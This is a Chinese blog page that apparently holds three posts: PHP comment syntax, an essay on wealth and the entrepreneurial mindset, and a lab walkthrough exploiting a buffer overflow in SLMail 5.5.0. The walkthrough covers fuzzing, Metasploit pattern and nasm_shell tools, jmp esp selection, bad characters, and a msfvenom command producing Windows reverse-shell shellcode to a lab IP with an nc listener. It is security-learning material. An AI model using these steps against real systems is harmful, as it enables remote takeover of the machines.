+<h4 id="单行注释-（"><a href="#单行注释-（" class="headerlink" title="单行注释 （##)"></a>单行注释 （##)</h4><h4 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/1.php%20%E6%A0%BC%E5%BC%8F%E4%B8%8E%E6%B3%A8%E9%87%8A.md/20201105192221349_150294211.png"></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="keyword">echo</span> (<span class="string">&quot;Hello,world!&quot;</span>); <span class="comment">## 你好世界！</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="多行注释-（-x2F"><a href="#多行注释-（-x2F" class="headerlink" title="多行注释 （&#x2F;*)"></a>多行注释 （&#x2F;*)</h4><h4 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/markdown/web/php/php/1.php%20%E6%A0%BC%E5%BC%8F%E4%B8%8E%E6%B3%A8%E9%87%8A.md/20201105192242968_652099615.png"></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        时间：15点51分</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	<span class="keyword">echo</span> (<span class="string">&quot;Hello,world!&quot;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>DA</th>
+<th>FA</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&#x2F;&#x2F;</td>
+<td>注释</td>
+<td>单行注释</td>
+</tr>
+<tr>
+<td>#</td>
+<td>注释</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>&#x2F;*</td>
+<td>多行注释</td>
+<td>多行注释</td>
+</tr>
+</tbody></table>
+
+	
+
+	
+
+</article>
+
+
+
+
+	<article>
+	
+		<h1><a href="/2022/04/21/outher/金融/1.认知/">认知</a></h1>
+	
+	<div class="article__infos">
+		<span class="article__date">2022-04-21</span><br />
+		
+		
+			<span class="article__tags">
+			  	<a class="article__tag-none-link" href="/tags/%E5%85%B6%E4%BB%96/" rel="tag">其他</a> <a class="article__tag-none-link" href="/tags/%E7%90%86%E8%B4%A2/" rel="tag">理财</a>
+			</span>
+		
+	</div>
+
+	
+
+	
+		<p>在目前的财富和认知上，能够赚钱的只有三重身份：</p>
+<ol>
+<li>资源者：提供时间</li>
+<li>企业家：整合各种资源经营并以此赚取利润；</li>
+<li>资本家：用钱投资产生利润</li>
+</ol>
+<h2 id="资源提供者"><a href="#资源提供者" class="headerlink" title="资源提供者"></a>资源提供者</h2><p>一个人的天赋是决定一生的积蓄，通常在20岁之前并没有展露出过人的才能和成就，那么基本上大上只能在中年才能展露出头角。</p>
+<p>大多数人的努力程度之低，并不到天赋的地步，有时候并不是努力就能成功的， 这是一种傲慢。</p>
+<p>世界是多样的，它可以容纳出各种想法、以及违背人类道德理论的东西出来，以给自身带来名气甚至是荣誉，而这些都与金钱挂钩，如何让自己不同，甚至是出色，是需要思考的。</p>
+<p>在通常，通过为人提供服务、打工&#x2F;上班，即提供资源者，那么时间是与金钱相互挂钩，这些与个人创造出多少价值并无关系，决定的是时间。</p>
+<p>惧怕任何风险对自己也是一种很大风险，在资源提供者中，很多一部分是追求安稳的收入，风险由老板或主要的创始团队，也就是企业家、资本家中承担。</p>
+<p>因此他们的收入往往比惧怕风险的人高上许多，在一个后两位角色中获得到第一第一桶金，需要考虑的是：</p>
+<ol>
+<li>如何自己分配更高的利润</li>
+<li>怎么为股东、团队、员工分配利益</li>
+<li>如何继续扩张</li>
+</ol>
+<p>在走向资源分配者的同时，身处的行业、领域也是会日新月异不断进步的，他并不是很稳定，如果没有跟上任何一个浪潮，那么自身也会陷入危机。</p>
+<h2 id="企业家"><a href="#企业家" class="headerlink" title="企业家"></a>企业家</h2><p>对于一个企业家来说，需要拥有思维和执行力，思维再多没有执行力也是纸上谈兵， 对于企业家和消费者思维的不同之处在于，在你的生活里。</p>
+<p>“你会看到各种各样的东西，普遍拥有消费者思维的人只会有两种感觉即：“喜欢&#x2F;不喜欢”。</p>
+<p>而企业家思维的人会考虑这个成本是多少，怎么去实现出来，如何盈利，以及它是如何出现在我们的视眼里面的。</p>
+<p>两者思维的不同之处在于，你是考虑事物的本身，还是考虑内在的因素，你只有考虑到内在因素后，才能体现出你的执行力。”</p>
+<p>同时，为了避免陷入资源者提供时间的循环中，你还需要考虑如何让自己离开这个循环，让其他人帮你做事，自己只需要完成最终的决策、规则的制定，以及利益的分配即可。</p>
+<p>在企业家思维中，你不需要考虑自己本身需要什么，而是需要考虑到大众需要什么，如何从需求中赚取利润。</p>
+<p>在创业的同时，本身就是一种成功，创业并不需要做成腾讯、阿里这样的 world 500 top 才叫成功。</p>
+<p>大部分人创业很多都是瞎折腾，莫名其妙的提出这种念头，在没有充分准本的情况下创业，并没有考虑到成本、固定、可变、以及机会的成本，最终导致失败。</p>
+<p>其次更多的是自己热爱某个方面领域而创业，但需要记住，消费者只会因为你解决了他们的需求而给你付钱。</p>
+<p>同时，拥有这种思维的人并不会因为别人的干扰来决定这个想法是否被执行。</p>
+<p>在学习的过程中，看别人的视频、书籍更多的主要是让你知道他们是如何解决的，而将他们的变成自己的又是另外一回事，通常这其中只有书籍的含金量更高，门槛也更高。</p>
+<p>学习是自己的事情，与教育无关， 教育决定的是你的本身圈子、阶级和社会地位，而学习决定的是你个人的知识水平，学习更高的效率就是学习一遍、自己动手实践一遍，将实践过程中的收获、以及原本书上的内容再去阐述一遍，更好。</p>
+<p>企业家思维中最有用的是，一边做一边学，这样就算你并不是一个企业家，是一个资源提供者，你的学习能力也会比普通人更高。</p>
+<h2 id="资本家"><a href="#资本家" class="headerlink" title="资本家"></a>资本家</h2><p>资本家的本质就是金钱，也就是让别人为你付钱，本质上就是放贷，而生活中最能体现这一特点的就是银行。</p>
+<p>假设你在银行中存放 1,0000元，此时银行就是你的负债，因为银行需要为你支付利息，而“财富自由”是建立在银行为你提供负债的基础上的附加金额（也就是被动消费），实质上 1,0000 元的本金分毫未动。</p>
+<p>“当一个消费金额大于附加金额，大于本金的人，永远不能成为资本家”</p>
+<p>时间是永远大于金钱的，你目前所赚到的钱相比，当下的钱算不了什么，不要为了省钱而浪费时间，你的时间是最可贵的。</p>
+<p>当你购买东西的时候，你需要思考，她是否可以给你带来他本质金额上可以给你带来什么，甚至是创造什么来解决你的时间。</p>
+<p>在资本家的视野里，不要购买超出自己能力的东西，也就是附加金额，因为一旦超出，你的时间、注意力就会被绑架，将自己抽出苦海，有了时间可以干任何事，才叫财富自由。</p>
+<p>债务越多，其本身就无法实现财富自由， 资本的本质在于其和资金的使用长短有关，而资金的使用时长其是否有限，时需要考虑的。</p>
+<p>假设你通过动用原本的 1,0000 所产生的被动金额，来进行投资，亏损的时候自己是否可以承担，而承担后时候可以有足够的时间按来等，是最主要的。</p>
+<p>也就是需要你有足够的存款，和利润来投入，其本金不变，通过利润进行生钱的方式，因为有了本钱，和眼光以及承受风险和分析能力，你才能够成功。</p>
+
+	
+
+	
+
+</article>
+
+
+
+
+	<article>
+	
+		<h1><a href="/2022/04/21/outher/逆向/Slmail/">Slmail</a></h1>
+	
+	<div class="article__infos">
+		<span class="article__date">2022-04-21</span><br />
+		
+		
+			<span class="article__tags">
+			  	<a class="article__tag-none-link" href="/tags/%E7%BC%93%E5%AD%98%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/" rel="tag">缓存区溢出攻击</a>
+			</span>
+		
+	</div>
+
+	
+
+	
+		<p>首先需要安装分析工具Immunity Debugger，还有nona-master及slmail 5.5.0版本。需要注意的是你的系统要为Windwos xp ，否则会有很大的麻烦等着你解决。</p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215180419.png"></p>
+<p>等你安装slmail的时候，一定要记得开启了POP3服务，否则无法使用，当然你需要记住slmail中最重要的一个东西，那就是slmail的地址，如果你不知道开有没有开的话可以使用kali自带的nc 进行连接，比如nc 192.168.79.163 ，如果有反应，而不一直在一个地方没有显示下一个命令，那就是你的pop出现了问题，你可以使用services.msc 打开服务窗口，当然你需要使用 win + r。</p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215180432.png"></p>
+<p>然后找到POP3服务将他开启，也很好找，你找到S开头的，然后找到后面有POP的就完事了，右键启动。</p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215180444.png"></p>
+<p>然后打开Immunity即可之后选择File Attach 找到slmail的端口，其实你找到110端口就可以了，就是Attach，选择。</p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215180457.png"></p>
+<p>之后开启开启服务，就是上面工具栏的那个播放键，点击可以发现右边的计算器清零了。</p>
+<h2 id="二，开始猜测崩溃字符数量"><a href="#二，开始猜测崩溃字符数量" class="headerlink" title="二，开始猜测崩溃字符数量"></a>二，开始猜测崩溃字符数量</h2><p>然后使用工具就可以了，具体使用方法可以输入 help 即可，然后找到对应的模块，比如说help slmail 查看slmail的帮助手册，这一步也可以称为是模糊测试。</p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215180533.png"></p>
+<p>当你执行第一个的时候，如果填写了一个对的Ip，稍后你的immunity右边计算器中的ECX和ESP及ASCII都会出现AAAAA等。此时slmail以及崩溃了。。我们还需要使用services.msc 重新启动他的服务。</p>
+<h2 id="三，指定字符量"><a href="#三，指定字符量" class="headerlink" title="三，指定字符量"></a>三，指定字符量</h2><p>此时我们在使用下一个工具，这个工具是发送2700个A，和第一个不同的是他可以准确的知道你要发多少个A.</p>
+<p>你会发现这次会比上次的更快，是因为我们在使用第一个工具的时候，已经猜出了在2700的时候已经把slmail塞满了，所以我们在时候这个工具的时候会指定2700，因为2700是他崩溃的字符数量。，我们会发现在ECX和ESP及ASCII中都和上面一样出现了类似的A，是因为我们仅仅指定的字符量。其他的没有改变。</p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215180554.png"><br>此时我们的slmil又再一次的崩溃了，所以我们需要使用services.msc再一次启动他，或者说是重启他。</p>
+<h2 id="四，寻找一处字符位置"><a href="#四，寻找一处字符位置" class="headerlink" title="四，寻找一处字符位置"></a>四，寻找一处字符位置</h2><p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215180644.png"></p>
+<p>此时我们需要使用msf中的一个工具，其使用方法是进入msf的工具(tools)目录下使用，当果然你也可以一句话完成此操作比如：&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;tools&#x2F;exploit&#x2F;pattern_create.rb -l 2700会生成共有2700的字符，大小写都不是非常统一的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds</span><br></pre></td></tr></table></figure>
+
+<p>此时我们可以再一次看到ECX or ESP和ASII部分再一次被填满，最重要的是我们发现了EIS寄存器的值为39694438.</p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215180708.png"></p>
+<p>他将是你的最大一个惊喜，你可以使用msf的另一个工具pattern_offset.rb，来解析他准确的字符位置，而39 69 44 38是一个内存地址是根据内存低的放在第一位，内存低的地址放在低位，所以如果要根据人们可以理解的是 38 44 69 39 （你可以理解为 “低 高 低 高”然后内存地址差不多就是“30 40 20 60”）这个顺序。然后根据ASII码对应的是表是8Di9。</p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215180721.png"></p>
+<p>使用msf自带的工具来解析这个39694438准确的字符位置,命令为：&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;tools&#x2F;exploit&#x2F;pattern_offset.rb -q 39694438 其得出结果为</p>
+<h2 id="五，准确的写入其对应位置。"><a href="#五，准确的写入其对应位置。" class="headerlink" title="五，准确的写入其对应位置。"></a>五，准确的写入其对应位置。</h2><p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215180738.png"><br>此时我们已经将A写入到了ECX，C写入到了ESP，然后B写入到了EIP,，其内容42424242根据ASII编码对照来说是BBBB</p>
+<h2 id="六，查找允许注入的字符数量"><a href="#六，查找允许注入的字符数量" class="headerlink" title="六，查找允许注入的字符数量"></a>六，查找允许注入的字符数量</h2><p>在不同的漏洞和谢意当中，会将某些字符认为是怀字符，这些字符有固定的用用途，比如你在计算机中，计算机会认为\n 是一个换行的操作，比如你输入 print “Helo.\nWorld!”此时的输入结果一定是 Hello在第一行，world！在第二行。</p>
+<p>此时我们可以使用help slmail 进行查看我们需要使用的第五个程序，这个存在就是将所有字符列出，然后发送到slmail服务器中，之后判断有多少个坏字符</p>
+<p>重定向数据流用esp的地址替换eip的值，但是esp编码是可以变化的，并不是该固定的因为slmail是基于线程的程序，是由操作系统分配的一个范围。而每次分配的范围都是不一样的。</p>
+<p>此时我们使用攻击模块发现在左下方窗口之中发现从A结束之后就是到C了，我们开始计算C的数量</p>
+<p>此时我们发现发现在ESP中有很多C，如果想查看其内容可以鼠标选择对应位置，然后右键至Follow in Dump 即可</p>
+<ol>
+<li>然后发现C前面的是A，然后出现了4个B,到A154时发现出现了C</li>
+</ol>
+<p>2.起始位置为A154<br><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215180847.png"></p>
+<p>结束位置为2F4<br><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215180900.png"></p>
+<p>之后我们打开计算器计算，选择科学计算模式，然后在选择十六进制并输入我们得到的起始位置和结束位置，可以得到结果为416</p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215180913.png"></p>
+<p>此时我们得到结果esp可以允许shellcodo 可以容纳416个字节。</p>
+<h2 id="七，查找坏字符"><a href="#七，查找坏字符" class="headerlink" title="七，查找坏字符"></a>七，查找坏字符</h2><p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215180931.png"></p>
+<p>当我们使用攻击模块的时候发现，当攻击到09后的时候就已经出错了，所以我们修改09，查找对应字符为x0a，所以我们决定将x0a替换为x09，此时我们发现00 0A 0D是坏字符，无法注入在缓冲区当中</p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215180937.png"></p>
+<p>如果想达到重定向这个目的的haul，需要我们吧EIP的地址重定向到ESP之中，那么经过我们的测试发现，只要将EIP的字符更改为ESP的地址，则CPU就会在到ESP读取。从而执行我们的shellcode。ESP地址是变化的，所以我们需要找到固定系统模块</p>
+<h2 id="八，找固定系统模块"><a href="#八，找固定系统模块" class="headerlink" title="八，找固定系统模块"></a>八，找固定系统模块</h2><p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215181001.png"></p>
+<p>如果发生了以上的重定向数据流的问题，我们需要找到一个内存中固定的系统模块。 也就是无论重启多少次，经历了多少的折磨，都是不变的地址。</p>
+<p>我们需要将一个esp添加到eip，此时cpu就会先读取eip然后在读取系统默认模块的地址，之后才读取了esp内容。从而执行了shelllcode</p>
+<p>Rebase （操作系统重启F）SafaSEH&#x2F;ASLR&#x2F;NXCompat&#x2F;这是哪个操作系统内存的保护机制一定选择为False ，而最后一个OS DII是操作系统自带的一个库，所以我们选择True</p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215181009.png"></p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215181013.png"></p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215181018.png"></p>
+<p>我们一个个筛选，首先我们需要有把汇编语句转换为二进制语句，这里可以使用nasm_shell.rb将汇编命令转换为二进制命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/metasploit-framework/tools/exploit/</span><br><span class="line"></span><br><span class="line">./nasm_shell.rb</span><br></pre></td></tr></table></figure>
+
+<p>需要吧 jmp esp 汇编指令为转换为二进制语句。，得出为FFE4，由于我们输入的是二进制语句所以我们需要加个x</p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215181111.png"></p>
+<p>slmfc.dll 是我们目标库的后缀名为 slmfc.dll</p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215181127.png"></p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215181133.png"></p>
+<p>此时我们需要对FFE4进行断点操作，当程序流程走到这个地方的时候，则执行我们的攻击模块。</p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215181200.png"></p>
+<p>在FFE4中插入我们的shellcode，ity 进行分析，当执行到FFF4的时候程序停止，因为程序以及运行到了FFF4的时候，证明程序以及执行到了EIP之中特就是说EIP 0157A154的存储内容为FFE4，此时我们在进行下一波运行，</p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215181141.png"></p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215181230.png"></p>
+<p>此时我们已经成功跳转并执行了ESP，使用msf生成shelllcode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.79.132 LPORT=4444 -f c --platform windows -b &quot;\x00\x0a\x0d&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215181251.png"></p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215181256.png"></p>
+<p>将代码插入我们的攻击模块源代码中，然后执行，使用nc -vlp 4444 监听4444端口。</p>
+<p><img src="https://49812933408852955071488026628034-1301075051.cos.ap-nanjing.myqcloud.com/20220215181308.png"></p>
+
+	
+
+	
+
+</article>
+
+
+
+
+
+	<span class="different-posts">📖 <a href="/page/33">more posts</a> 📖</span>
+
+
+
+	</main>
+
+	<footer class="footer">
+	<div class="footer-content">
+		
+	      <div class="footer__element">
+	<p>欢迎来到我的 blog <br><br> 通过 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>+<a target="_blank" rel="noopener" href="https://github.com/HoverBaum/meilidu-hexo">MeiliDu</a> 进行构建的，存放在 <a target="_blank" rel="noopener" href="https://github.com/vendanges/vendanges.github.io">Github</a> 上。</p>
+</div>
+
+	    
+	      <div class="footer__element">
+	<h5>Check out</h5>
+	<ul class="footer-links">
+		<li class="footer-links__link"><a href="/archives">Archive</a></li>
+		
+		  <li class="footer-links__link"><a href="/atom.xml">RSS</a></li>
+	    
+		<li class="footer-links__link"><a href="/about">about page</a></li>
+		<li class="footer-links__link"><a href="/tags">Tags</a></li>
+		<li class="footer-links__link"><a href="/categories">Categories</a></li>
+	</ul>
+</div>
+
+	    
+
+		<div class="footer-credit">
+			<span>© 2022 John Doe | Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> | Theme <a target="_blank" rel="noopener" href="https://github.com/HoverBaum/meilidu-hexo">MeiliDu</a></span>
+		</div>
+
+	</div>
+
+
+</footer>
+
+
+
+</body>
+
+</html>
